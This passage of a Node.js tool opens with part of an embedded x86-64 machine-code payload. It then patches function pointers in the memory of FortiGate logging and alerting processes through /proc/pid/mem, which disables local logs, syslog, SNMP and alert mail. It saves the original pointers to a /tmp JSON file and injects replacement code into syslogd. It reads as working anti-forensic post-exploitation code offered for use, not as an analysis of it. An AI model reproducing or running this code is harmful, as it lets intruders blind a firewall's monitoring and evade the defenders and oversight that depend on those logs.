	0xE0, 0x48, 0x8B, 0x4D, 0x98, 0xBA, 0xA4, 0x01, 0x00, 0x00, 0xBE, 0x41, 0x04, 0x00, 0x00, 0x48, 
	0x89, 0xC7, 0xFF, 0xD1, 0x89, 0x85, 0xC4, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0xC0, 0xFE, 0xFF, 0xFF, 
	0x48, 0x63, 0xD0, 0x48, 0x8B, 0x4D, 0x80, 0x8B, 0x85, 0xC4, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0x45, 
	0x90, 0x48, 0x89, 0xCE, 0x89, 0xC7, 0x41, 0xFF, 0xD0, 0x48, 0x89, 0x45, 0xA8, 0x8B, 0x85, 0xC4, 
	0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xA0, 0x89, 0xC7, 0xFF, 0xD2, 0x83, 0xBD, 0xAC, 0xFE, 0xFF, 
	0xFF, 0x00, 0x0F, 0x85, 0x80, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x58, 0xFF, 0xFF, 0xFF, 0x89, 
	0xC2, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x80, 0x15, 0xE7, 0x05, 0x48, 0x89, 
	0xC6, 0x48, 0x8B, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x8D, 0x08, 0xFF, 0xFF, 0xFF, 0x48, 
	0x89, 0xC7, 0xFF, 0xD1, 0x89, 0x85, 0xC8, 0xFE, 0xFF, 0xFF, 0x8B, 0x85, 0xC8, 0xFE, 0xFF, 0xFF, 
	0x89, 0x85, 0xCC, 0xFE, 0xFF, 0xFF, 0x83, 0xBD, 0xC8, 0xFE, 0xFF, 0xFF, 0x00, 0x7F, 0x0F, 0xC7, 
	0x85, 0xA8, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x83, 0x02, 0x00, 0x00, 0x48, 0x8B, 
	0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x80, 0x15, 0xE7, 0x05, 0x48, 0x89, 0xC6, 0x8B, 0x95, 
	0xC8, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x8D, 0x10, 0xFF, 
	0xFF, 0xFF, 0x48, 0x89, 0xC7, 0xFF, 0xD1, 0x89, 0x85, 0xD0, 0xFE, 0xFF, 0xFF, 0xC7, 0x85, 0xA8, 
	0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x83, 0xBD, 0xD0, 0xFE, 0xFF, 0xFF, 0x00, 0x0F, 0x85, 
	0x3D, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x70, 0x48, 
	0x89, 0xC1, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x78, 0x48, 0x89, 0xC2, 
	0x8B, 0x01, 0x89, 0x02, 0x83, 0xBD, 0x90, 0xFE, 0xFF, 0xFF, 0x01, 0x75, 0x2C, 0x8B, 0x85, 0xCC, 
	0xFE, 0xFF, 0xFF, 0x48, 0x98, 0x48, 0x8D, 0x50, 0x04, 0x48, 0x8B, 0x85, 0x98, 0xFE, 0xFF, 0xFF, 
	0x48, 0x83, 0xC0, 0x24, 0x8B, 0x00, 0x89, 0xC1, 0x48, 0x8B, 0x85, 0x18, 0xFF, 0xFF, 0xFF, 0x48, 
	0x89, 0xD6, 0x48, 0x89, 0xCF, 0xFF, 0xD0, 0xEB, 0x1C, 0x8B, 0x85, 0xCC, 0xFE, 0xFF, 0xFF, 0x8D, 
	0x48, 0x04, 0x8B, 0x85, 0x94, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x95, 0x20, 0xFF, 0xFF, 0xFF, 0x89, 
	0xCE, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 0x98, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x24, 
	0x8B, 0x00, 0x89, 0xC0, 0x48, 0x89, 0x45, 0xC8, 0x48, 0xC7, 0x85, 0xE0, 0xFE, 0xFF, 0xFF, 0x00, 
	0x00, 0x00, 0x00, 0x8B, 0x85, 0xCC, 0xFE, 0xFF, 0xFF, 0x8D, 0x48, 0x04, 0x8B, 0x85, 0x90, 0xFE, 
	0xFF, 0xFF, 0x48, 0x8B, 0x55, 0xC8, 0x89, 0xD7, 0x8B, 0x95, 0x94, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 
	0x85, 0x28, 0xFF, 0xFF, 0xFF, 0x89, 0xC6, 0x41, 0xFF, 0xD0, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 
	0xFF, 0x48, 0x8B, 0x95, 0x30, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0xC7, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 
	0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x10, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x95, 0x48, 0xFF, 
	0xFF, 0xFF, 0x48, 0x8D, 0x8A, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x95, 0x38, 0xFF, 0xFF, 0xFF, 
	0x48, 0x89, 0xC6, 0x48, 0x89, 0xCF, 0xFF, 0xD2, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 
	0x83, 0xC0, 0x20, 0x0F, 0xB6, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0x92, 0x00, 0x00, 0x00, 0x48, 0x8B, 
	0x85, 0xE0, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x50, 0x01, 0x48, 0x89, 0x95, 0xE0, 0xFE, 0xFF, 0xFF, 
	0x48, 0x89, 0xC2, 0x48, 0xC1, 0xE2, 0x03, 0x48, 0x29, 0xC2, 0x48, 0x89, 0xD0, 0x48, 0x89, 0x45, 
	0xD0, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x28, 0x48, 0x8B, 0x00, 0x48, 
	0x8B, 0x55, 0xD0, 0x48, 0xC1, 0xE2, 0x03, 0x48, 0x01, 0xD0, 0x48, 0x83, 0xC0, 0x08, 0x48, 0x8B, 
	0x00, 0x48, 0x8B, 0x95, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC2, 0x28, 0x48, 0x8B, 0x12, 0x48, 
	0x8B, 0x4D, 0xD0, 0x48, 0xC1, 0xE1, 0x03, 0x48, 0x01, 0xCA, 0x48, 0x83, 0xC2, 0x10, 0x48, 0x89, 
	0xD1, 0x48, 0x8B, 0x95, 0x38, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0xC6, 0x48, 0x89, 0xCF, 0xFF, 0xD2, 
	0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x20, 0x0F, 0xB6, 0x00, 0x0F, 0xBE, 
	0xC0, 0x48, 0x8B, 0x95, 0xE0, 0xFE, 0xFF, 0xFF, 0x39, 0xD0, 0x0F, 0x8F, 0x6E, 0xFF, 0xFF, 0xFF, 
	0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x05, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00, 
	0x48, 0x89, 0x45, 0xD8, 0x48, 0x83, 0x7D, 0xD8, 0x00, 0x74, 0x21, 0x48, 0x8B, 0x45, 0xD8, 0x48, 
	0x8B, 0x00, 0x48, 0x8B, 0x55, 0xD8, 0x48, 0x83, 0xC2, 0x10, 0x48, 0x89, 0xD1, 0x48, 0x8B, 0x95, 
	0x38, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0xC6, 0x48, 0x89, 0xCF, 0xFF, 0xD2, 0xC7, 0x85, 0xA8, 0xFE, 
	0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0xEB, 0x59, 0x48, 0x8B, 0x85, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 
	0x05, 0xE8, 0xCD, 0xFE, 0x04, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x45, 0xB0, 0x48, 0x8B, 0x45, 0xB0, 
	0x48, 0x89, 0x45, 0xB8, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 0x08, 0x48, 
	0x8B, 0x00, 0x48, 0x89, 0x45, 0xC0, 0x48, 0x8B, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC0, 
	0x74, 0x8B, 0x00, 0x89, 0xC6, 0x48, 0x8B, 0x45, 0xC0, 0x48, 0x8B, 0x4D, 0xB8, 0xBA, 0x00, 0x00, 
	0x00, 0x00, 0x48, 0x89, 0xC7, 0xFF, 0xD1, 0xC7, 0x85, 0xA8, 0xFE, 0xFF, 0xFF, 0x01, 0x00, 0x00, 
	0x00, 0x8B, 0x85, 0xA8, 0xFE, 0xFF, 0xFF, 0x89, 0x85, 0xD4, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 
	0x48, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xE8, 0x80, 0x48, 0x89, 0xC2, 0x48, 0x8B, 0x85, 0x40, 0xFF, 
	0xFF, 0xFF, 0x48, 0x89, 0xD7, 0xFF, 0xD0, 0x8B, 0x85, 0xD4, 0xFE, 0xFF, 0xFF, 0xEB, 0x07, 0x48, 
	0x8B, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7D, 0xF8, 0x64, 0x48, 0x33, 0x3C, 0x25, 0x28, 
	0x00, 0x00, 0x00, 0x74, 0x05, 0xE8, 0x26, 0xE8, 0xFF, 0xFF, 0xC9, 0xC3, 0xE9, 0xBF, 0x00, 0x00, 
	0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 
	0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 
	0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 
	0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 
	0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1F, 0x40, 0x00

]);


// Address constants (modify according to your target environment)


// ==================== Memory Read/Write (Synchronous) ====================

/**
 * Write data to target process memory (synchronous)
 * @param {number} pid Target process PID
 * @param {bigint} address Starting virtual address
 * @param {Buffer} data Buffer to write
 * @returns {number} Number of bytes written
 * @throws Will throw if bytes written != data.length
 */
function writeProcessMemory(pid, address, data) {
    const memPath = `/proc/${pid}/mem`;
    let fd = null;
    try {
        fd = fs.openSync(memPath, 'r+');
        const bytesWritten = fs.writeSync(fd, data, 0, data.length, Number(address));
        if (bytesWritten !== data.length) {
            throw new Error(`Wrote only ${bytesWritten} bytes, expected ${data.length}`);
        }
        return bytesWritten;
    } finally {
        if (fd !== null) fs.closeSync(fd);
    }
}

function ipToBinary(ip) {
    const parts = ip.split('.').map(Number);
    if (parts.length !== 4 || parts.some(p => p < 0 || p > 255 || isNaN(p))) {
        throw new Error('Invalid IPv4 address');
    }
    return Buffer.from(parts);
}

/**
 * Read data from target process memory (synchronous)
 * @param {number} pid Target process PID
 * @param {bigint} address Starting virtual address
 * @param {number} length Number of bytes to read
 * @returns {Buffer} Buffer containing read data
 * @throws Will throw if bytes read != length
 */
function readProcessMemory(pid, address, length) {
    const memPath = `/proc/${pid}/mem`;
    let fd = null;
    try {
        fd = fs.openSync(memPath, 'r');
        const buffer = Buffer.alloc(length);
        const bytesRead = fs.readSync(fd, buffer, 0, length, Number(address));
        if (bytesRead !== length) {
            throw new Error(`Read only ${bytesRead} bytes, expected ${length}`);
        }
        return buffer;
    } finally {
        if (fd !== null) fs.closeSync(fd);
    }
}



// ==================== Utility Functions ====================

/**
 * Convert buffer (little-endian) to 64-bit unsigned BigInt
 */
function bufferToUint64LE(buf) {
    return buf.readBigUInt64LE(0);
}


function intToBuffer(num) {
    const buf = Buffer.alloc(4);
    // 取低 32 位（无符号），高位自动丢弃
    const truncated = BigInt(num) & 0xFFFFFFFFn;
    buf.writeUInt32LE(Number(truncated), 0);
    return buf;
}

/**
 * Convert 64-bit BigInt to little-endian buffer
 */
function uint64LEToBuffer(value) {
    const buffer = Buffer.alloc(8);
    buffer.writeBigUInt64LE(value, 0);
    return buffer;
}



/**
 * Find PID of a process by name (synchronous)
 * @param {string} targetName Process name (e.g., 'locallogd')
 * @returns {number} Process PID
 * @throws If no matching process is found
 */
function getPidByName(targetName) {
    const procDir = '/proc';
    let entries;
    try {
        entries = fs.readdirSync(procDir);
    } catch (err) {
        throw new Error(`Cannot read /proc directory: ${err.message}`);
    }

    for (const entry of entries) {
        if (!/^\d+$/.test(entry)) continue;
        const pid = parseInt(entry, 10);
        const statPath = path.join(procDir, pid.toString(), 'stat');
        let statContent;
        try {
            statContent = fs.readFileSync(statPath, 'utf8');
        } catch (err) {
            continue; // Process may have exited
        }
        const leftParen = statContent.indexOf('(');
        const rightParen = statContent.lastIndexOf(')');
        if (leftParen === -1 || rightParen === -1) continue;
        const comm = statContent.substring(leftParen + 1, rightParen);
        if (comm === targetName) {
            return pid;
        }
    }
    throw new Error(`Process with name "${targetName}" not found`);
}



/**
 * Write two addresses to a JSON file (synchronous)
 * @param {bigint} writeaddr - write function address
 * @param {bigint} fwriteaddr - fwrite function address
 */
function writeAddress(writeAddr, fwriteAddr,writevAddr,sendAddr,session_io_event_Addr,sendmsgAddr) {
	const jsonObject = {
		write: '0x' + writeAddr.toString(16),   // 例如 "0x7f8a4c0"
		fwrite: '0x' + fwriteAddr.toString(16),
		writev: '0x' + writevAddr.toString(16),
		send: '0x' + sendAddr.toString(16),
		session_io_event: '0x' + session_io_event_Addr.toString(16),
		sendmsg: '0x' + sendmsgAddr.toString(16)
	};
	console.log(jsonObject);
	
    const jsonString = JSON.stringify(jsonObject, null, 2);		//2: 2 spaces at front of each line
    try {
        fs.writeFileSync('/tmp/fortigate_log_control.json', jsonString, 'utf8');
        console.log('JSON file written successfully:', '/tmp/fortigate_log_control.json');
    } catch (err) {
        console.error('Write failed:', err);
    }
}



/**
 * Read addresses from JSON file and convert back to BigInt (synchronous)
 * @returns {{ write: bigint, fwrite: bigint }}
 * @throws If file read or parse fails
 */
function readAddress() {
    try {
        const jsonString = fs.readFileSync('/tmp/fortigate_log_control.json', 'utf8');
		console.log(jsonString);
        const jsonObject = JSON.parse(jsonString);
        const write = BigInt(jsonObject.write);
        const fwrite = BigInt(jsonObject.fwrite);
		const writev = BigInt(jsonObject.writev);
		const send = BigInt(jsonObject.send);
		const session_io_event = BigInt(jsonObject.session_io_event);
		const sendmsg = BigInt(jsonObject.sendmsg);
        return { write, fwrite ,writev,send,session_io_event,sendmsg};
    } catch (err) {
        console.error('Read or parse failed:', err);
        throw err;
    }
}




function writeFilter(hookAddr1,hookAddr2) {
	const jsonObject = {
		hookAddress1: '0x' + hookAddr1.toString(16),
		hookAddress2: '0x' + hookAddr2.toString(16)
	};
	console.log(jsonObject);
	
    const jsonString = JSON.stringify(jsonObject, null, 2);		//2: 2 spaces at front of each line
    try {
        fs.writeFileSync('/tmp/fortigate_filter.json', jsonString, 'utf8');
        console.log('JSON file written successfully:', '/tmp/fortigate_filter.json');
    } catch (err) {
        console.error('Write failed:', err);
    }
}




function readFilter() {
    try {
        const jsonString = fs.readFileSync('/tmp/fortigate_filter.json', 'utf8');
		console.log(jsonString);
        const jsonObject = JSON.parse(jsonString);
        const hookAddr1 = BigInt(jsonObject.hookAddress1);
		const hookAddr2 = BigInt(jsonObject.hookAddress2);
        return { hookAddr1,hookAddr2};
    } catch (err) {
        console.error('Read or parse failed:', err);
        throw err;
    }
}



/**
 * Get base address of an executable from /proc/pid/maps (synchronous)
 * @param {number} pid Process PID
 * @param {string} execPath Path to executable (e.g., '/bin/init')
 * @returns {bigint} Starting virtual address
 * @throws If maps file cannot be read or path not found
 */
function getExecutableBase(pid, execPath) {
    const mapsPath = `/proc/${pid}/maps`;
    let mapsContent;
    try {
        mapsContent = fs.readFileSync(mapsPath, 'utf8');
    } catch (err) {
        throw new Error(`Cannot read ${mapsPath}: ${err.message}`);
    }

    const lines = mapsContent.split('\n');
    for (const line of lines) {
        if (line.trim() === '') continue;
        const fields = line.trim().split(/\s+/);
        if (fields.length < 6) continue;
        const pathname = fields.slice(5).join(' ');
        if (pathname === execPath) {
            const addrRange = fields[0];
            const startAddrStr = addrRange.split('-')[0];
            const startAddr = BigInt(`0x${startAddrStr}`);
            return startAddr;
        }
    }
    throw new Error(`Path "${execPath}" not found in maps of PID ${pid}`);
}



function GetAddresses(){

	const pid_mail = getPidByName('alertmail');
	console.log(`alertmail pid: ${pid_mail}`);

	let base_mail = getExecutableBase(pid_mail, '/bin/init');
	console.log(`alertmail base address: 0x${base_mail.toString(16)}`);
	
	const pid_snmpd = getPidByName('snmpd');
	console.log(`snmpd pid: ${pid_snmpd}`);

	let base_snmpd = getExecutableBase(pid_snmpd, '/bin/init');
	console.log(`snmpd base address: 0x${base_snmpd.toString(16)}`);
	
	const pid_locallogd = getPidByName('locallogd');
	console.log(`locallogd pid: ${pid_locallogd}`);

	let base_locallogd = getExecutableBase(pid_locallogd, '/bin/init');
	console.log(`locallogd base address: 0x${base_locallogd.toString(16)}`);
	
	const pid_syslogd = getPidByName('syslogd');
	console.log(`syslogd pid: ${pid_syslogd}`);

	let base_syslogd = getExecutableBase(pid_syslogd, '/bin/init');
	console.log(`syslogd base address: 0x${base_syslogd.toString(16)}`);

	if (base_locallogd === 0x400000n )
	{
		ADDR_WRITEV_PTR = 0x42939E8n - base_syslogd;
		ADDR_WRITEV_REPLACE = 0x673F74n - base_syslogd;				//89 d8 c3 		"mov eax,ebx; ret"
		
		ADDR_FWRITE_PTR = 0x42945B8n - base_locallogd;
		ADDR_WRITE_PTR  = 0x4296D60n - base_locallogd;
		ADDR_RET_PTR_NONE = 0x43E016n - base_locallogd;				//c3 			ret
		ADDR_RET_PTR_ZERO = 0x1725FD3n - base_locallogd;			//31 c0 c3 		"xor rax,rax; ret"
		ADDR_RET_PTR_SIZE = 0x54FB08n - base_snmpd;					//48 89 d0 c3 	"mov rax,rdx; ret"
		ADDR_SEND_PTR = 0X4295508n - base_snmpd;
		
		ADDR_session_io_event_PTR = 0X4295928n - base_mail;
		
		//ADDR_SENDMSG_REPLACE = 0x14C3f60n - base_syslogd;
		ADDR_SENDMSG_REPLACE = 0x206B460n - base_syslogd;
		
		ADDR_SENDMSG_PTR = 0X4295C48n - base_syslogd;
		
		g_code_replace = g_code_11910A0_vm;
	}
	else{
		ADDR_WRITEV_PTR = 0x4FEBE98n;		//base = 0n;		
		ADDR_WRITEV_REPLACE = 0X63A7A4n;	//89 d8 c3 		"mov eax,ebx; ret"
		
		ADDR_FWRITE_PTR = 0x4FECB30n;   	// 存放 write 函数指针的地址（GOT 表项）
		ADDR_WRITE_PTR  = 0x4FEF468n;   	// 存放 fwrite 函数指针的地址

		ADDR_SEND_PTR = 0X4FEFE50n;
		
		ADDR_session_io_event_PTR = 0X4FEDF38n;		
		
		ADDR_RET_PTR_NONE = 0X3B8016n;		//c3 			"ret"
		ADDR_RET_PTR_ZERO = 0X107B64An;		//31 c0 c3 		"xor rax,rax; ret"
		ADDR_RET_PTR_SIZE = 0x4F7998n;		//48 89 d0 c3 	"mov rax,rdx; ret"
		
		//ADDR_SENDMSG_REPLACE = 0x465bf0n;
		ADDR_SENDMSG_REPLACE = 0x465c00n;
		
		ADDR_SENDMSG_PTR = 0X4FEE278n;
		
		g_code_replace = g_code_11910A0_phy;
	}

}

// ==================== Main Logic ====================

/**
 * Disable logging by reading original function pointers and saving them
 */
function disableLog() {
    try {
		const pid_mail = getPidByName('alertmail');
        console.log(`alertmail pid: ${pid_mail}`);

        let base_mail = getExecutableBase(pid_mail, '/bin/init');
        console.log(`alertmail base address: 0x${base_mail.toString(16)}`);
		
		const pid_snmpd = getPidByName('snmpd');
        console.log(`snmpd pid: ${pid_snmpd}`);

        let base_snmpd = getExecutableBase(pid_snmpd, '/bin/init');
        console.log(`snmpd base address: 0x${base_snmpd.toString(16)}`);
		
        const pid_locallogd = getPidByName('locallogd');
        console.log(`locallogd pid: ${pid_locallogd}`);

        let base_locallogd = getExecutableBase(pid_locallogd, '/bin/init');
        console.log(`locallogd base address: 0x${base_locallogd.toString(16)}`);
		
		const pid_syslogd = getPidByName('syslogd');
        console.log(`syslogd pid: ${pid_syslogd}`);

        let base_syslogd = getExecutableBase(pid_syslogd, '/bin/init');
        console.log(`syslogd base address: 0x${base_syslogd.toString(16)}`);

		console.log(`\r\n`);
        console.log(`ADDR_FWRITE_PTR:${ADDR_FWRITE_PTR.toString(16)},ADDR_WRITE_PTR:${ADDR_WRITE_PTR.toString(16)},ADDR_WRITEV_PTR:${ADDR_WRITEV_PTR.toString(16)},ADDR_SEND_PTR:${ADDR_SEND_PTR.toString(16)},ADDR_session_io_event_PTR:${ADDR_session_io_event_PTR.toString(16)}`);
		
		console.log(`\r\n`);
		console.log(`ADDR_RET_PTR_ZERO:${ADDR_RET_PTR_ZERO.toString(16)},ADDR_RET_PTR_NONE:${ADDR_RET_PTR_NONE.toString(16)},ADDR_RET_PTR_SIZE:${ADDR_RET_PTR_SIZE.toString(16)}`);
		
        const bytesFwriteAddr = readProcessMemory(pid_locallogd, base_locallogd + ADDR_FWRITE_PTR, 8);
        const bytesWriteAddr = readProcessMemory(pid_locallogd, base_locallogd + ADDR_WRITE_PTR, 8);  
		const bytesWritevAddr = readProcessMemory(pid_syslogd, base_syslogd + ADDR_WRITEV_PTR, 8);
		const bytesSendAddr = readProcessMemory(pid_snmpd, base_snmpd + ADDR_SEND_PTR, 8);
		const bytesSioeAddr = readProcessMemory(pid_mail, base_mail + ADDR_session_io_event_PTR, 8);
		const bytesSendmsg = readProcessMemory(pid_syslogd, base_syslogd + ADDR_SENDMSG_PTR, 8);
		
        const FwriteAddr = bufferToUint64LE(bytesFwriteAddr);
        const WriteAddr  = bufferToUint64LE(bytesWriteAddr);
		const WritevAddr = bufferToUint64LE(bytesWritevAddr);
		const SendAddr = bufferToUint64LE(bytesSendAddr);
		const SioeAddr = bufferToUint64LE(bytesSioeAddr);
		const sendmsgAddr = bufferToUint64LE(bytesSendmsg);
		
		if(FwriteAddr === WriteAddr && (base_locallogd + ADDR_RET_PTR_ZERO === WriteAddr)){
			console.log(`already in disable state.Nothing to do`);
			console.log(`fwrite:${FwriteAddr.toString(16)},write:${WriteAddr.toString(16)},writev:${WritevAddr.toString(16)}`);
			return 0;
		}
		writeAddress(WriteAddr, FwriteAddr,WritevAddr,SendAddr,SioeAddr,sendmsgAddr);
		
		console.log(`\r\n`);
		console.log(`write: 0x${ADDR_WRITE_PTR.toString(16)} QWORD: 0x${WriteAddr.toString(16)}`);
        console.log(`fwrite: 0x${ADDR_FWRITE_PTR.toString(16)} QWORD: 0x${FwriteAddr.toString(16)}`);
        console.log(`writev: 0x${ADDR_WRITEV_PTR.toString(16)} QWORD: 0x${WritevAddr.toString(16)}`);
		console.log(`send: 0x${ADDR_SEND_PTR.toString(16)} QWORD: 0x${SendAddr.toString(16)}`);
		console.log(`session_io_event: 0x${ADDR_session_io_event_PTR.toString(16)} QWORD: 0x${SioeAddr.toString(16)}`);

        const fwriteCode = readProcessMemory(pid_locallogd, FwriteAddr, 16);
        const writeCode  = readProcessMemory(pid_locallogd, WriteAddr, 16);
		const writevCode  = readProcessMemory(pid_syslogd, WritevAddr, 16);
		const sendAddrCode  = readProcessMemory(pid_snmpd, SendAddr, 16);
		const sioeAddrCode  = readProcessMemory(pid_mail, SioeAddr, 16);

        console.log(`\n[fwrite] ${FwriteAddr.toString(16)} 16 bytes:`);
        console.log(`  hex: ${fwriteCode.toString('hex')}`);

        console.log(`\n[write] ${WriteAddr.toString(16)} 16 bytes:`);
        console.log(`  hex: ${writeCode.toString('hex')}`);
		
		console.log(`\n[writev] ${WritevAddr.toString(16)} 16 bytes:`);
        console.log(`  hex: ${writevCode.toString('hex')}`);
		
		console.log(`\n[send] ${SendAddr.toString(16)} 16 bytes:`);
        console.log(`  hex: ${sendAddrCode.toString('hex')}`);
		
		console.log(`\n[session_io_event] ${SioeAddr.toString(16)} 16 bytes:`);
        console.log(`  hex: ${sioeAddrCode.toString('hex')}`);
		
		const bytesRetVZ = readProcessMemory(pid_locallogd, base_locallogd + ADDR_RET_PTR_ZERO, 8);
		const bytesRetVN = readProcessMemory(pid_locallogd, base_locallogd + ADDR_RET_PTR_NONE, 8);
		const bytesRetVS = readProcessMemory(pid_locallogd, base_locallogd + ADDR_RET_PTR_SIZE, 8);
		const retValueZ  = bufferToUint64LE(bytesRetVZ);
		const retValueN  = bufferToUint64LE(bytesRetVN);
		const retValueS  = bufferToUint64LE(bytesRetVS);

		//整数（Number / BigInt）：可以使用 toString(16) 将其转换为十六进制字符串，不能使用 toString('hex')
		//Buffer 类型（如 Buffer.alloc 返回的实例）：可以使用 toString('hex') 将二进制数据编码为十六进制字符串，不能使用 toString(16)		
		console.log(`\n[ADDR_RET_PTR_ZERO] ${retValueZ.toString(16)} 16 bytes:`);
        console.log(`  hex: ${bytesRetVZ.toString('hex')}`);
		console.log(`\n[ADDR_RET_PTR_NONE] ${retValueN.toString(16)} 16 bytes:`);
        console.log(`  hex: ${bytesRetVN.toString('hex')}`);
		console.log(`\n[ADDR_RET_PTR_SIZE] ${retValueS.toString(16)} 16 bytes:`);
        console.log(`  hex: ${bytesRetVS.toString('hex')}`);
		
		const bytesRetAddrZ = uint64LEToBuffer(base_locallogd + ADDR_RET_PTR_ZERO);
        writeProcessMemory(pid_locallogd, base_locallogd + ADDR_FWRITE_PTR, bytesRetAddrZ);
        writeProcessMemory(pid_locallogd, base_locallogd + ADDR_WRITE_PTR, bytesRetAddrZ);
		
		const bytesWritevReplaceAddr = uint64LEToBuffer(base_syslogd + ADDR_WRITEV_REPLACE);	
		writeProcessMemory(pid_syslogd, base_syslogd + ADDR_WRITEV_PTR, bytesWritevReplaceAddr);
		
		const bytesRetAddrSize = uint64LEToBuffer(base_snmpd + ADDR_RET_PTR_SIZE);	
		writeProcessMemory(pid_snmpd, base_snmpd + ADDR_SEND_PTR, bytesRetAddrSize);
				
		const bytesRetAddrNone = uint64LEToBuffer(base_mail + ADDR_RET_PTR_NONE);	
		writeProcessMemory(pid_mail, base_mail + ADDR_session_io_event_PTR, bytesRetAddrNone);
		
		const bytesSendmsgReplace = uint64LEToBuffer(base_syslogd + ADDR_SENDMSG_REPLACE);	
		writeProcessMemory(pid_syslogd, base_syslogd + ADDR_SENDMSG_PTR, bytesSendmsgReplace);
		
		writeProcessMemory(pid_syslogd, base_syslogd + ADDR_SENDMSG_REPLACE, g_code_sendmsg);
    } catch (err) {
        console.error(`error: ${err.message}`);
        process.exit(1);
    }
}



/**
 * Enable logging by restoring original function pointers saved earlier
 */
function enableLog() {
    try {
		const pid_mail = getPidByName('alertmail');
        console.log(`alertmail pid: ${pid_mail}`);

        let base_mail = getExecutableBase(pid_mail, '/bin/init');
        console.log(`alertmail base address: 0x${base_mail.toString(16)}`);
		
		const pid_snmpd = getPidByName('snmpd');
        console.log(`snmpd pid: ${pid_snmpd}`);

        let base_snmpd = getExecutableBase(pid_snmpd, '/bin/init');
        console.log(`snmpd base address: 0x${base_snmpd.toString(16)}`);
		
        const pid_locallogd = getPidByName('locallogd');
        console.log(`locallogd pid: ${pid_locallogd}`);

        let base_locallogd = getExecutableBase(pid_locallogd, '/bin/init');
        console.log(`locallogd base address: 0x${base_locallogd.toString(16)}`);
		
		const pid_syslogd = getPidByName('syslogd');
        console.log(`syslogd pid: ${pid_syslogd}`);

        let base_syslogd = getExecutableBase(pid_syslogd, '/bin/init');
        console.log(`syslogd base address: 0x${base_syslogd.toString(16)}`);

		console.log(`\r\n`);
